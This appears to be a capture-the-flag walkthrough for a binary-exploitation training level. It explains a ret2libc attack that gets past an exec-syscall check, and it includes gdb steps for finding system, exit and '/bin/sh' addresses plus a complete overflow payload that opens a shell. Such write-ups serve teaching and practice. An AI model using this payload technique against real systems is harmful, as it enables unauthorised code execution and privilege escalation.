We can see that the program watches for exec syscalls, so we cannot use our usual shellcode. One to bypass this is to use a ret2libc

lets do a ret to libc attack

get addresses through gdb

create and compile executable which calls system

$ scp -P 4242 Ressources/getgotinfo.c level04@192.168.56.101:/tmp


$ (gdb) p system

$ (gdb) p exit

now get the address of "/bin/sh" in libc

$ find START_ADDR, END_ADDR, "/bin/sh"

we use gdb to find that the offset is 156. we now have everything we need to craft our exploit

$ (python -c 'print "i" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]' ; cat) | ./level04

we now have a shell with level05 access
